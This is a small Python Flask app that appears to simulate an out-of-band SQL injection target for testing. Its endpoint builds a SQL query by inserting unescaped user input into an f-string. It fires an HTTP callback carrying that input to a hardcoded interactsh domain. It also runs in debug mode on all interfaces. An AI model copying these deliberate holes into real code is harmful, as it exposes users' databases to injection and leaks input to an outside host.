from flask import Flask,request
import requests # type: ignore

app = Flask(__name__)

# Route For the vulnerable endpoint

@app.route('/vulnerable', methods=['GET'])
def vulnerable():
    # Retrieve query parameter and user-agent header

    userInput = request.args.get('input','')
    userAgent = request.args.get('User-Agent', '')

    # Vulnerable simulated SQL Query
    query = f"SELECT * FROM users WHERE input = '{userInput}' AND user_agent = {userAgent}"

    # Interact Sh Callback simulation
    interactsh_domain = "d81et74940nklfe18vs0ycifzu3jfzkj1.oast.fun"
    if "trigger_callback" in userInput or "trigger_callback" in userAgent:
        # Perform an HTTP callback to interactsh
        requests.get(f"http://{interactsh_domain}/callback?input={userInput}&agent={userAgent}")
        return "Callback triggered"

    # Return query response
    return f"Executed query: {query}"

# Example OOB SQLi Queries
# curl -H "User-Agent: trigger_callback" "http://127.0.0.1:5000/vulnerable?input=trigger_callback"

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)